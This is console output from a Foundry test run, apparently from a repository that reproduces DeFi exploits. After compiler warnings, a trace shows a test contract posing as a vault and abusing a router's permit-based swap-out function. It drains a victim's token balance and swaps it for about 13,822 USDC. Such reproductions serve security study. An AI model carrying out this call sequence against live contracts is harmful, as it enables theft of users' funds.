Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.14s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2022-11/NUM_exp.sol:28:5:
   |
28 |     IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:2629:1:
     |
2629 | interface USDC {
     | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2022-11/NUM_exp.sol:29:5:
   |
29 |     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2018): Function state mutability can be restricted to view
  --> src/test/2022-11/NUM_exp.sol:60:5:
   |
60 |     function underlying() external returns (address) {
   |     ^ (Relevant source part starts here and spans across multiple lines).

Warning (2018): Function state mutability can be restricted to view
  --> src/test/2022-11/NUM_exp.sol:64:5:
   |
64 |     function depositVault(uint256 amount, address to) external returns (uint256) {
   |     ^ (Relevant source part starts here and spans across multiple lines).

Warning (2018): Function state mutability can be restricted to pure
  --> src/test/2022-11/NUM_exp.sol:68:5:
   |
68 |     function burn(address from, uint256 amount) external returns (bool) {
   |     ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 247.92ms (217.37µs CPU time)

Ran 1 test for src/test/2022-11/NUM_exp.sol:ContractTest
[PASS] testExploit() (gas: 272362)
Logs:
  [End] Attacker USDC balance after exploit: 13822.280101

Traces:
  [319762] ContractTest::testExploit()
    ├─ [10049] 0x3496B523e5C00a4b4150D6721320CdDb234c3079::balanceOf(0x78AC2624a2Cd193E8dEfE9F39A9528e8bd4a368c) [staticcall]
    │   ├─ [2770] 0xd39015041518064743D955cF550C611b0b68888c::balanceOf(0x78AC2624a2Cd193E8dEfE9F39A9528e8bd4a368c) [delegatecall]
    │   │   └─ ← [Return] 557754450001980916242788 [5.577e23]
    │   └─ ← [Return] 557754450001980916242788 [5.577e23]
    ├─ [45249] 0x765277EebeCA2e31912C9946eAe1021199B39C61::anySwapOutUnderlyingWithPermit(0x78AC2624a2Cd193E8dEfE9F39A9528e8bd4a368c, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 557754450001980916242788 [5.577e23], 1669173599 [1.669e9], 0, 0x3078000000000000000000000000000000000000000000000000000000000000, 0x3078000000000000000000000000000000000000000000000000000000000000, 12)
    │   ├─ [397] ContractTest::underlying() [staticcall]
    │   │   └─ ← [Return] 0x3496B523e5C00a4b4150D6721320CdDb234c3079
    │   ├─ [1507] 0x3496B523e5C00a4b4150D6721320CdDb234c3079::permit(0x78AC2624a2Cd193E8dEfE9F39A9528e8bd4a368c, 0x765277EebeCA2e31912C9946eAe1021199B39C61, 557754450001980916242788 [5.577e23], 1669173599 [1.669e9], 0, 0x3078000000000000000000000000000000000000000000000000000000000000, 0x3078000000000000000000000000000000000000000000000000000000000000)
    │   │   ├─ [698] 0xd39015041518064743D955cF550C611b0b68888c::permit(0x78AC2624a2Cd193E8dEfE9F39A9528e8bd4a368c, 0x765277EebeCA2e31912C9946eAe1021199B39C61, 557754450001980916242788 [5.577e23], 1669173599 [1.669e9], 0, 0x3078000000000000000000000000000000000000000000000000000000000000, 0x3078000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 
    │   ├─ [35089] 0x3496B523e5C00a4b4150D6721320CdDb234c3079::transferFrom(0x78AC2624a2Cd193E8dEfE9F39A9528e8bd4a368c, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 557754450001980916242788 [5.577e23])
    │   │   ├─ [34301] 0xd39015041518064743D955cF550C611b0b68888c::transferFrom(0x78AC2624a2Cd193E8dEfE9F39A9528e8bd4a368c, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 557754450001980916242788 [5.577e23]) [delegatecall]
    │   │   │   ├─ emit Transfer(from: 0x78AC2624a2Cd193E8dEfE9F39A9528e8bd4a368c, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 557754450001980916242788 [5.577e23])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ [527] ContractTest::depositVault(557754450001980916242788 [5.577e23], 0x78AC2624a2Cd193E8dEfE9F39A9528e8bd4a368c)
    │   │   └─ ← [Return] 557754450001980916242788 [5.577e23]
    │   ├─ [445] ContractTest::burn(0x78AC2624a2Cd193E8dEfE9F39A9528e8bd4a368c, 557754450001980916242788 [5.577e23])
    │   │   └─ ← [Return] true
    │   ├─ emit LogAnySwapOut(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 0x78AC2624a2Cd193E8dEfE9F39A9528e8bd4a368c, param2: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param3: 557754450001980916242788 [5.577e23], param4: 1, param5: 12)
    │   └─ ← [Stop] 
    ├─ [25340] 0x3496B523e5C00a4b4150D6721320CdDb234c3079::approve(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ [24558] 0xd39015041518064743D955cF550C611b0b68888c::approve(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   └─ ← [Return] true
    │   └─ ← [Return] true
    ├─ [24420] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::approve(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [1549] 0x3496B523e5C00a4b4150D6721320CdDb234c3079::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [770] 0xd39015041518064743D955cF550C611b0b68888c::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 557754450001980916242788 [5.577e23]
    │   └─ ← [Return] 557754450001980916242788 [5.577e23]
    ├─ [46727] 0x3496B523e5C00a4b4150D6721320CdDb234c3079::transfer(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45, 557754450001980916242788 [5.577e23])
    │   ├─ [45945] 0xd39015041518064743D955cF550C611b0b68888c::transfer(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45, 557754450001980916242788 [5.577e23]) [delegatecall]
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45, value: 557754450001980916242788 [5.577e23])
    │   │   ├─ [204] 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45::onTokenTransfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 557754450001980916242788 [5.577e23], 0x)
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   ├─ emit ContractFallbackCallFailed(: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45, : 557754450001980916242788 [5.577e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Return] true
    ├─ [115100] 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45::swapExactTokensForTokens(0, 0, [0x3496B523e5C00a4b4150D6721320CdDb234c3079, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   ├─ [1549] 0x3496B523e5C00a4b4150D6721320CdDb234c3079::balanceOf(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45) [staticcall]
    │   │   ├─ [770] 0xd39015041518064743D955cF550C611b0b68888c::balanceOf(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45) [delegatecall]
    │   │   │   └─ ← [Return] 557754450001980916242788 [5.577e23]
    │   │   └─ ← [Return] 557754450001980916242788 [5.577e23]
    │   ├─ [16560] 0x3496B523e5C00a4b4150D6721320CdDb234c3079::transfer(0x22527f92f43Dc8bEa6387CE40B87EbAa21f51Df3, 557754450001980916242788 [5.577e23])
    │   │   ├─ [15778] 0xd39015041518064743D955cF550C611b0b68888c::transfer(0x22527f92f43Dc8bEa6387CE40B87EbAa21f51Df3, 557754450001980916242788 [5.577e23]) [delegatecall]
    │   │   │   ├─ emit Transfer(from: 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45, to: 0x22527f92f43Dc8bEa6387CE40B87EbAa21f51Df3, value: 557754450001980916242788 [5.577e23])
    │   │   │   ├─ [248] 0x22527f92f43Dc8bEa6387CE40B87EbAa21f51Df3::onTokenTransfer(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45, 557754450001980916242788 [5.577e23], 0x)
    │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   ├─ emit ContractFallbackCallFailed(: 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45, : 0x22527f92f43Dc8bEa6387CE40B87EbAa21f51Df3, : 557754450001980916242788 [5.577e23])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ [9815] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   ├─ [2529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [2504] 0x22527f92f43Dc8bEa6387CE40B87EbAa21f51Df3::getReserves() [staticcall]
    │   │   └─ ← [Return] 4471975987887882437324911 [4.471e24], 124980337944 [1.249e11], 1669161515 [1.669e9]
    │   ├─ [1549] 0x3496B523e5C00a4b4150D6721320CdDb234c3079::balanceOf(0x22527f92f43Dc8bEa6387CE40B87EbAa21f51Df3) [staticcall]
    │   │   ├─ [770] 0xd39015041518064743D955cF550C611b0b68888c::balanceOf(0x22527f92f43Dc8bEa6387CE40B87EbAa21f51Df3) [delegatecall]
    │   │   │   └─ ← [Return] 5029730437889863353567699 [5.029e24]
    │   │   └─ ← [Return] 5029730437889863353567699 [5.029e24]
    │   ├─ [69704] 0x22527f92f43Dc8bEa6387CE40B87EbAa21f51Df3::swap(0, 13822280101 [1.382e10], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [35517] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 13822280101 [1.382e10])
    │   │   │   ├─ [34728] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 13822280101 [1.382e10]) [delegatecall]
    │   │   │   │   ├─ emit Transfer(from: 0x22527f92f43Dc8bEa6387CE40B87EbAa21f51Df3, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 13822280101 [1.382e10])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   ├─ [1549] 0x3496B523e5C00a4b4150D6721320CdDb234c3079::balanceOf(0x22527f92f43Dc8bEa6387CE40B87EbAa21f51Df3) [staticcall]
    │   │   │   ├─ [770] 0xd39015041518064743D955cF550C611b0b68888c::balanceOf(0x22527f92f43Dc8bEa6387CE40B87EbAa21f51Df3) [delegatecall]
    │   │   │   │   └─ ← [Return] 5029730437889863353567699 [5.029e24]
    │   │   │   └─ ← [Return] 5029730437889863353567699 [5.029e24]
    │   │   ├─ [1315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0x22527f92f43Dc8bEa6387CE40B87EbAa21f51Df3) [staticcall]
    │   │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(0x22527f92f43Dc8bEa6387CE40B87EbAa21f51Df3) [delegatecall]
    │   │   │   │   └─ ← [Return] 111158057843 [1.111e11]
    │   │   │   └─ ← [Return] 111158057843 [1.111e11]
    │   │   ├─ emit Sync(reserve0: 5029730437889863353567699 [5.029e24], reserve1: 111158057843 [1.111e11])
    │   │   ├─ emit Swap(sender: 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45, amount0In: 557754450001980916242788 [5.577e23], amount1In: 0, amount0Out: 0, amount1Out: 13822280101 [1.382e10], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Stop] 
    │   ├─ [1315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   │   └─ ← [Return] 13822280101 [1.382e10]
    │   │   └─ ← [Return] 13822280101 [1.382e10]
    │   └─ ← [Return] 13822280101 [1.382e10]
    ├─ [1315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 13822280101 [1.382e10]
    │   └─ ← [Return] 13822280101 [1.382e10]
    ├─ emit log_named_decimal_uint(key: "[End] Attacker USDC balance after exploit", val: 13822280101 [1.382e10], decimals: 6)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 454.08ms (4.46ms CPU time)

Ran 2 test suites in 462.92ms (702.00ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
